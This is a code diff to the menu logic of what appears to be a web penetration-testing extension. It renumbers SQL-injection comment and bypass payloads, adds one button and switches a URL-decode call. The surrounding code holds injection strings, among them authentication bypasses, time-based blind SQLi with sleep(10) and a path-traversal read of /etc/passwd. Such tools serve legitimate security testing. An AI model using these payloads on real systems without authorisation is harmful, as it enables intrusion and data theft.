@@ -82,6 +82,7 @@ var bpass6Btn = document.getElementsByName("bpass6")[0];
 var bpass7Btn = document.getElementsByName("bpass7")[0];
 var bpass8Btn = document.getElementsByName("bpass8")[0];
 var bpass9Btn = document.getElementsByName("bpass9")[0];
+var bpass10Btn = document.getElementsByName("bpass10")[0];
 var dsubBtn = document.getElementsByName("dsub")[0];
 var dsub2Btn = document.getElementsByName("dsub2")[0];
 var dsub3Btn = document.getElementsByName("dsub3")[0];
@@ -272,10 +273,10 @@ bpass6Btn.addEventListener('click', anonClickMenuFunct, false);
 bpass7Btn.addEventListener('click', anonClickMenuFunct, false);
 bpass8Btn.addEventListener('click', anonClickMenuFunct, false);
 bpass9Btn.addEventListener('click', anonClickMenuFunct, false);
+bpass10Btn.addEventListener('click', anonClickMenuFunct, false);
 dsubBtn.addEventListener('click', anonClickMenuFunct, false);
 dsub2Btn.addEventListener('click', anonClickMenuFunct, false);
 dsub3Btn.addEventListener('click', anonClickMenuFunct, false);
-
 waf1Btn.addEventListener('click', anonClickMenuFunct, false);
 waf2Btn.addEventListener('click', anonClickMenuFunct, false);
 waf3Btn.addEventListener('click', anonClickMenuFunct, false);
@@ -344,23 +345,6 @@ pass15Btn.addEventListener('click', anonClickMenuFunct, false);
 pass16Btn.addEventListener('click', anonClickMenuFunct, false);
 pass17Btn.addEventListener('click', anonClickMenuFunct, false);
 pass18Btn.addEventListener('click', anonClickMenuFunct, false);
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 spacestocommentsBtn.addEventListener('click', anonClickMenuFunct, false);
 stringtocharcodeBtn.addEventListener('click', anonClickMenuFunct, false);
 stringtohtmlcharcodeBtn.addEventListener('click', anonClickMenuFunct, false);
@@ -911,69 +895,62 @@ function onClickMenu(event) {
                         txt = "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd%00";
                         this.setSelectedText( txt );
                     break;
-                    
             case 'bpass':
+                        txt = "' -- -";
+                        this.setSelectedText(txt);
+                        break;                     
+            case 'bpass1':
                         txt = "%23";
                         this.setSelectedText(txt);
                         break; 
-            case 'bpass1':
-                        txt = "')-- -";
-                        this.setSelectedText(txt);
-                        break;  
             case 'bpass2':
-                        txt = "%60";
+                        txt = "')-- -";
                         this.setSelectedText(txt);
                         break; 
             case 'bpass3':
-                        txt = "')--+";
+                        txt = "%60";
                         this.setSelectedText(txt);
                         break; 
             case 'bpass4':
+                        txt = "')--+";
+                        this.setSelectedText(txt);
+                        break; 
+            case 'bpass5':
                         txt = "%00";
                         this.setSelectedText(txt);
                         break;  
-            case 'bpass5':
+            case 'bpass6':
                         txt = "%90";
                         this.setSelectedText(txt);
                         break; 
-            case 'bpas6':
+            case 'bpass7':
                         txt = "%2323";
                         this.setSelectedText(txt);
                         break; 
-            case 'bpass7':
+            case 'bpass8':
                         txt = ")--";
                         this.setSelectedText(txt);
                         break;  
-            case 'bpass8':
+            case 'bpass9':
                         txt = "--";
                         this.setSelectedText(txt);
                         break; 
-            case 'bpass9':
+            case 'bpass10':
                         txt = "--+-";
                         this.setSelectedText(txt);
-                        break; 
-                                 
+                        break;
             case 'dsub' :
                         txt = 'substring(database(),1,1)="a"';
                         this.setSelectedText(txt);
-                        break; 
-                        
+                        break;
             case 'dsub2' :
                         txt = "and sleep(10) and 1=1";
                         this.setSelectedText(txt);
-                        break;   
-                        
+                        break;
             case 'dsub3' :
                         txt = 'and sleep(10) and database()="xyz"';
                         this.setSelectedText(txt);
-                        break;                                
-                                  
-
-                  
-                  
-                  
-                                                          
-
+                        break;
             case 'pass' :
                         txt = "or 'x'='x";
                         this.setSelectedText(txt);
@@ -1050,91 +1027,6 @@ function onClickMenu(event) {
                         txt = "admin') or '1'='1'--";
                         this.setSelectedText(txt);
                         break;                                
-                                 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
         case 'mysqlbasicinfo':
             newString = SQL.selectionMySQLBasicInfo();
             this.setSelectedText(newString);
@@ -1230,7 +1122,7 @@ function onClickMenu(event) {
         case 'urldecode':
             txt = this.getSelectedText();
             if (txt !== false) {
-                newString = unescape(txt);
+                newString = urldecode(txt);
                 this.setSelectedText(newString);
             }
             break;
